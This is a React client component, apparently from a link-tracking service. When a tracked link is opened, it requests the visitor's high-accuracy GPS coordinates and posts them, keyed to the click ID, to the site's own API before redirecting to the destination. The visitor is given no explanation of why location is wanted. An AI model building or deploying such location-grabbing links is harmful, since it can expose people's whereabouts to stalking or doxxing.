"use client";

import { useEffect } from "react";

interface TrackerClientProps {
  code: string;
  targetUrl: string | null;
  clickId: number | null;
}

export default function TrackerClient({ code, targetUrl, clickId }: TrackerClientProps) {
  useEffect(() => {
    if (!targetUrl) return;

    const redirectNow = () => {
      window.location.replace(targetUrl);
    };

    if (!navigator.geolocation || !clickId) {
      redirectNow();
      return;
    }

    let redirected = false;

    const timer = setTimeout(() => {
      if (!redirected) {
        redirected = true;
        redirectNow();
      }
    }, 8000);

    navigator.geolocation.getCurrentPosition(
      async (pos) => {
        await fetch(`/api/t-geo/${code}`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            click_id: clickId,
            gps_latitude: pos.coords.latitude,
            gps_longitude: pos.coords.longitude,
            gps_accuracy: pos.coords.accuracy,
          }),
        }).catch(() => {});

        clearTimeout(timer);
        if (!redirected) {
          redirected = true;
          redirectNow();
        }
      },
      () => {
        clearTimeout(timer);
        if (!redirected) {
          redirected = true;
          redirectNow();
        }
      },
      { enableHighAccuracy: true, timeout: 7000, maximumAge: 0 }
    );
  }, [code, targetUrl, clickId]);

  return null;
}
